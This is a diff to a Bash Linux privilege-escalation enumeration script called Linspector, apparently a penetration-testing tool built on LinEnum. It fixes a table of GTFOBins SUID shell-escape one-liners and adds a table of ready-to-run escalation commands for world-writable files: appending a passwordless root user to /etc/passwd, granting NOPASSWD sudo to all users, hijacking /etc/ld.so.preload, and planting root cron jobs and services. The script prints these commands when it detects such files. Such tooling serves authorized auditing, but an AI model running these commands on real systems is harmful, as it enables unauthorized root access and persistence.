@@ -14,7 +14,7 @@
 # Resource-optimized Linux enumeration & hardening script
 # Based on original LinEnum by rebootuser
 #=============================================================================
-version="1.5.0"
+version="1.7.0"
 script_name="Linspector"
 
 #=============================================================================
@@ -91,6 +91,7 @@ CACHED_SUDO_OUTPUT=""
 declare -A CACHED_CAPABILITIES
 CACHED_WRITABLE_CRONS=""
 CACHED_WRITABLE_SERVICES=""
+declare -a CACHED_WRITABLE_CRITICAL
 IN_DOCKER_GROUP=0
 IN_LXD_GROUP=0
 IN_DOCKER_CONTAINER=0
@@ -599,7 +600,7 @@ GTFO_SUID_EXPLOITS=(
     ["vim"]="vim -c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
     ["vi"]="vi -c ':!sh -p' -c ':q'"
     ["nmap"]="nmap --interactive\\nnmap> !sh -p"
-    ["awk"]="awk 'BEGIN {system(\"/bin/sh -p")}'"
+    ["awk"]="awk 'BEGIN {system(\"/bin/sh -p\")}'"
     ["perl"]="perl -e 'exec \"/bin/sh\";'"
     ["python"]="python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
     ["python3"]="python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
@@ -672,6 +673,33 @@ KERNEL_EXPLOITS=(
     ["3.16"]="eBPF_verifier|CVE-2017-16995"
     ["1.3.0"]="PwnKit|CVE-2021-4034"
     ["5.10"]="DirtyPipe|CVE-2022-0847"
+)
+
+# World-writable file exploit patterns - organized by severity
+declare -A WRITABLE_FILE_EXPLOITS
+WRITABLE_FILE_EXPLOITS=(
+    # CRITICAL - Instant root access
+    ["/etc/passwd"]="CRITICAL|Add root user|echo 'hacker::0:0:root:/root:/bin/bash' >> /etc/passwd"
+    ["/etc/shadow"]="CRITICAL|Modify root password|openssl passwd -1 -salt xyz password >> /etc/shadow"
+    ["/etc/sudoers"]="CRITICAL|Grant sudo access|echo 'ALL ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
+    ["/etc/sudoers.d"]="CRITICAL|Grant sudo access|echo 'ALL ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/privesc"
+    ["/etc/ld.so.preload"]="CRITICAL|Library hijacking|echo '/tmp/evil.so' > /etc/ld.so.preload"
+    
+    # HIGH - Reliable privilege escalation
+    ["/etc/cron.d"]="HIGH|Inject cron job|echo '* * * * * root /tmp/shell.sh' > /etc/cron.d/privesc"
+    ["/etc/cron.daily"]="HIGH|Inject daily cron|echo '/tmp/shell.sh' > /etc/cron.daily/privesc && chmod +x"
+    ["/etc/cron.hourly"]="HIGH|Inject hourly cron|echo '/tmp/shell.sh' > /etc/cron.hourly/privesc && chmod +x"
+    ["/etc/cron.monthly"]="HIGH|Inject monthly cron|echo '/tmp/shell.sh' > /etc/cron.monthly/privesc && chmod +x"
+    ["/etc/cron.weekly"]="HIGH|Inject weekly cron|echo '/tmp/shell.sh' > /etc/cron.weekly/privesc && chmod +x"
+    ["/etc/systemd/system"]="HIGH|Malicious service|Create service with ExecStart=/tmp/shell.sh"
+    ["/etc/init.d"]="HIGH|Malicious init script|Create executable script, will run as root on boot"
+    ["/usr/local/bin"]="HIGH|Binary hijacking|Create malicious binary in PATH with common name"
+    ["/usr/local/sbin"]="HIGH|Binary hijacking|Create malicious sbin binary, often called by root"
+    
+    # MEDIUM - Conditional or environment-dependent
+    ["/opt"]="MEDIUM|Application hijacking|Replace application binaries if executed by privileged process"
+    ["/var/www"]="MEDIUM|Web shell upload|Upload PHP/CGI shell if web server runs as root"
+    ["/home/.ssh"]="MEDIUM|SSH key injection|Add authorized_keys if user can sudo"
 )
 
 #=============================================================================
@@ -1031,9 +1059,17 @@ interesting_files() {
         safe_find /home -maxdepth 4 -name ".git-credentials" -type f
         echo ""
         
-        # World-writable files - VERY limited
-        echo -e "\e[00;31m[-] World-writable files (sample):\e[00m"
-        safe_find / -maxdepth 4 ! -path "*/proc/*" ! -path "/sys/*" -perm -2 -type f 2>/dev/null | head -30 | while read -r wwfile; do
+        # World-writable files - focus on critical paths and cache results
+        echo -e "\e[00;31m[-] World-writable files in critical paths:\e[00m"
+        # Scan critical directories for privilege escalation analysis
+        while IFS= read -r wwfile; do
+            CACHED_WRITABLE_CRITICAL+=("$wwfile")
+            ls -la "$wwfile" 2>/dev/null
+        done < <(find /etc /usr/local/bin /usr/local/sbin /opt -maxdepth 3 -perm -0002 -type f 2>/dev/null | head -40)
+        
+        # Also show sample from /home and /var/www if in thorough mode
+        find /home /var/www -maxdepth 3 -perm -0002 -type f 2>/dev/null | head -10 | while read -r wwfile; do
+            CACHED_WRITABLE_CRITICAL+=("$wwfile")
             ls -la "$wwfile" 2>/dev/null
         done
         echo ""
@@ -1369,6 +1405,88 @@ analyze_cron_vectors() {
     return $found
 }
 
+# Analyze world-writable files for privilege escalation
+analyze_writable_files() {
+    local found=0
+    
+    # Check if we have cached results
+    if [ "${#CACHED_WRITABLE_CRITICAL[@]}" -eq 0 ]; then
+        return 0
+    fi
+    
+    # Track which file patterns we've already reported to avoid duplicates
+    declare -A reported_patterns
+    
+    # Process each writable file
+    for wwfile in "${CACHED_WRITABLE_CRITICAL[@]}"; do
+        # Get directory path for pattern matching
+        local dirpath=$(dirname "$wwfile")
+        
+        # Check against exploit database
+        for pattern in "${!WRITABLE_FILE_EXPLOITS[@]}"; do
+            if [[ "$wwfile" == *"$pattern"* ]] || [[ "$dirpath" == *"$pattern"* ]]; then
+                # Avoid duplicate pattern reports
+                if [ -n "${reported_patterns[$pattern]}" ]; then
+                    continue
+                fi
+                reported_patterns[$pattern]=1
+                
+                # Parse exploit info
+                local info="${WRITABLE_FILE_EXPLOITS[$pattern]}"
+                local severity=$(echo "$info" | cut -d'|' -f1)
+                local description=$(echo "$info" | cut -d'|' -f2)
+                local exploit=$(echo "$info" | cut -d'|' -f3-)
+                
+                # Output based on severity
+                if [ "$severity" = "CRITICAL" ]; then
+                    echo -e "\e[00;31m[CRITICAL] World-writable: $pattern\e[00m"
+                    echo -e "\e[00;32m           $description\e[00m"
+                    echo -e "\e[00;33m           $exploit\e[00m"
+                    echo -e "\e[00;90m           File: $wwfile\e[00m"
+                    echo ""
+                    ((PRIVESC_FINDINGS++))
+                    found=1
+                elif [ "$severity" = "HIGH" ]; then
+                    echo -e "\e[00;31m[HIGH] World-writable: $pattern\e[00m"
+                    echo -e "\e[00;32m       $description\e[00m"
+                    echo -e "\e[00;33m       $exploit\e[00m"
+                    echo -e "\e[00;90m       File: $wwfile\e[00m"
+                    echo ""
+                    ((PRIVESC_FINDINGS++))
+                    found=1
+                elif [ "$severity" = "MEDIUM" ]; then
+                    echo -e "\e[00;31m[MEDIUM] World-writable: $pattern\e[00m"
+                    echo -e "\e[00;32m         $description\e[00m"
+                    echo -e "\e[00;33m         $exploit\e[00m"
+                    echo -e "\e[00;90m         File: $wwfile\e[00m"
+                    echo ""
+                    ((PRIVESC_FINDINGS++))
+                    found=1
+                fi
+                
+                # Break after first match to avoid duplicate reports
+                break
+            fi
+        done
+    done
+    
+    # Check for writable directories in critical locations
+    for critical_dir in "/etc/cron.d" "/etc/systemd/system" "/usr/local/bin" "/usr/local/sbin"; do
+        if [ -d "$critical_dir" ] && [ -w "$critical_dir" ] 2>/dev/null; then
+            if [ -z "${reported_patterns[$critical_dir]}" ]; then
+                reported_patterns[$critical_dir]=1
+                echo -e "\e[00;31m[HIGH] Directory writable: $critical_dir\e[00m"
+                echo -e "\e[00;32m       Can create malicious files for privilege escalation\e[00m"
+                echo ""
+                ((PRIVESC_FINDINGS++))
+                found=1
+            fi
+        fi
+    done
+    
+    return $found
+}
+
 # Analyze container escape vectors
 analyze_container_breakouts() {
     local found=0
@@ -1448,6 +1566,7 @@ privilege_escalation_summary() {
     analyze_container_breakouts | grep -E "CRITICAL" && critical_found=1
     analyze_path_hijacking | grep -E "CRITICAL" && critical_found=1
     analyze_capabilities | grep -E "CRITICAL" && critical_found=1
+    analyze_writable_files | grep -E "CRITICAL" && critical_found=1
     [ "$critical_found" -eq 0 ] && echo -e "\e[00;90m[i] No critical findings\e[00m" && echo ""
     
     # HIGH priority findings
@@ -1459,6 +1578,7 @@ privilege_escalation_summary() {
     analyze_capabilities | grep -E "HIGH" && high_found=1
     analyze_path_hijacking | grep -E "HIGH" && high_found=1
     analyze_cron_vectors | grep -E "HIGH" && high_found=1
+    analyze_writable_files | grep -E "HIGH" && high_found=1
     analyze_nfs_exploits && high_found=1
     [ "$high_found" -eq 0 ] && echo -e "\e[00;90m[i] No high priority findings\e[00m" && echo ""
     
@@ -1470,6 +1590,7 @@ privilege_escalation_summary() {
     analyze_path_hijacking | grep -E "MEDIUM" && medium_found=1
     analyze_cron_vectors | grep -E "MEDIUM" && medium_found=1
     analyze_capabilities | grep -E "MEDIUM" && medium_found=1
+    analyze_writable_files | grep -E "MEDIUM" && medium_found=1
     [ "$medium_found" -eq 0 ] && echo -e "\e[00;90m[i] No medium priority findings\e[00m" && echo ""
     
     # Summary footer
